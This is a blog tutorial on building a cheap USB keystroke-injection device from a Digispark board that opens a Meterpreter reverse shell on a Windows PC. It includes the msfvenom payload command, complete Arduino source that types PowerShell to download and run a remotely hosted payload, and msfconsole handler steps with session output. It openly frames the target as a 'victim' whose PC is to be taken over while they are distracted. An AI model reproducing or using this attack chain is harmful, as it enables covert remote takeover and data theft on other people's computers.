+++
title = "Digispark Reverse-Shell"
date = 2018-01-20T17:03:46+01:00
draft = false
authors = ["_N0x"]
+++

# Reverse Shell for 1,50€ - Digispark instead of USB Rubber Ducky

Some of you might already have heard of it: The [USB Rubber Ducky by Hak5](https://hakshop.com/products/usb-rubber-ducky-deluxe). A very special USB-Device: Not only a mass storage device but any usb input-device you want it to be. Because of this you can use it for some very nice ways to get your payload onto a victims PC.  The Rubber Ducky is freely programmable so there are no limits on what you can do with it. The only problem is the high (but reasonable) price of $45. In this tutorial I will show you how you can use the Digispark USB Deveoplment Board as a cheap alternative. As an example we will be creating a reverse shell, that will be launched when you plug the Digispark into a windows PC.

## You will need:

* [Digispark USB Development Board](http://digistump.com/products/1)
* [Kali Linux](https://www.kali.org/) with [Metasploid-Framework](https://www.metasploit.com/)

## Digispark USB Development Board

The Digispark from Digistump is a tiny, programmable micro-controller that can be programmed with the [Arduino-IDE](https://www.arduino.cc/en/main/software). The syntax is very similar to the one of Arduino-Boards. A tutorial on how to set the IDE up for the Digispark can be found here: [Connecting and Programming Your Digispark](http://digistump.com/wiki/digispark/tutorials/connecting)

I bought a bunch of Digisparks of eBay for little money. They aren't original  (you can tell from the "rev3" which was never released) but they still are fully functional and perfect for our purposes.

For a nice video to set the Digispark up, check out this [tutorial by Seytonic](https://www.youtube.com/watch?v=fGmGBa-4cYQ)

## Creating the Payload

First of all we  need to create the payload that will be deployed and executed by the Digispark on our target machine. We will use [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) for this.

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f psh-cmd

You need to replace the LHOST parameter with you IP address. You also could use your domain and use the reverse shell even outside of your network.

Now... here we find the first difficulty. Unlike the Rubber Ducky which can use a SD-card of any size, the Digispark only has 6kb of internal memory and the library we are going to need to use the Digispark as a Keyboard itself has about 2,4kb.  So there is no space to place the payload directly on it.
To get our payload on the victim-PC we need to make it accessible on the web. We could use a local web-server, upload the plain payload to [pastebin](http://pastebin.com/) or just place it on our webspace.

## Programming The Digispark

After we've created the Payload we can start with programming the Digispark! Here we have to keep in mind that to program the Digispark you have to work with a US-Keyboard-Layout, this means you have to account for special characters and such if your keyboard layout is one of foreign origin.

The Sourcecode for the Digispark:

    #include "DigiKeyboard.h"

    /*  US-KEYBOARD-LAYOUT ONLY!!
    *
    *  still needs some testing... but should work
    *
    *  Made by _N0x
    *  Thanks to Alex (http://0xdeadcode.se/archives/581) for the idea of using a small powershell payload.
    */

    void setup() {
    // Adding some LED-effects just for fun ;)
    pinMode(1, OUTPUT);

    delay(100);
    // WIN+r, delete content, start powershell
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // WIN+r
    delay(100);
    DigiKeyboard.sendKeyStroke(KEY_DELETE); // Clean it up
    delay(50);
    DigiKeyboard.println("powershell");
    delay(500);

    // turn the LED on
    digitalWrite(1, HIGH);
    // $url = '...' --> URL to Payload
    DigiKeyboard.println("$url = 'LINK_TO_HOSTET_PAYLOAD'");
    delay(50);
    
    // $result = Invoke-WebRequest -Uri $url
    DigiKeyboard.println("$result = Invoke-WebRequest -Uri $url");
    delay(50);
    
    // powershell.exe -nop -e $result.content
    DigiKeyboard.println("powershell.exe -nop -e $result.content");

    // turn off the led if the payload is places and executed
    digitalWrite(1, LOW);

    delay(1500);
    DigiKeyboard.println("exit");
    }
    
    void loop() {
    // if done with the scripts LED starts blinking

    digitalWrite(1, HIGH);
    delay(150);
    
    digitalWrite(1, LOW);
    delay(500);
    
    }

In principle you can leave the script unchanged and only change the URL for the Payload, so that the Payload you chose can be downloaded. The Digispark should now be ready for use! Before you storm out and try to plug it into the next best USB-Port though, you should prepare Kali Linux so that your Reverse-Shell Session can be accessed directly and as soon as needed.

## Preparing MSFconsole

To prepare the receiving-end for the Reverse-Shell, open a Terminal on your Kali Linux system and start MSFconsole by entering

    root@kali:~# msfconsole

Then specify what exploit you want to use:

    msf > use exploit/multi/handler

Now there are still some parameters we have to determine:

    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 10.0.0.10
    LHOST => 10.0.0.10
    msf exploit(handler) > set LPORT 4444
    LPORT => 4444

Replace the vlaue of LHOST with the IP/Domain you used when creating the payload with MSFconsole

To finish things off we have to tell our Console that it has to wait for a new session:

    msf exploit(handler) > exploit -z -j
    [*] Exploit running as background job.

    [*] Started reverse TCP handler on 10.0.0.10:4444 
    [*] Starting the payload handler...

Now it's done! You can search for the next best PC to test your Digispark out! After you plug your Digispark in a Powershell will be opened and then closed, within this timeframe you have to distract your victim, after your USB Dev. Board starts to blink fastly you know your script has been executed and you can unplug the Digispark. If everything went how it should've your console should display this:

    msf exploit(handler) > [*] Sending stage (957487 bytes) to 10.0.0.3
    [*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.3:49678) at 2017-02-06 20:25:36 +0100

At last you have to pin your session, like this:

    msf exploit(handler) > sessions -i 1
    [*] Starting interaction with 1...

    meterpreter > 

And now: Congratulations! You now have a Reverse-Shell on your victims PC! With the command "help" you can see what you can do now.

Have fun, Good luck, Stay safe and don't let yourself get distracted by people with a Digispark! :D

## EDIT 2022-03-11:
Here are some more usefull tools people recommended to me over the years regarding creating payloads for the digispark from for example ducksript:
 - [duck2spark by MaMe82](https://github.com/mame82/duck2spark)
 - [OverThruster by RedLectroid](https://github.com/RedLectroid/OverThruster)
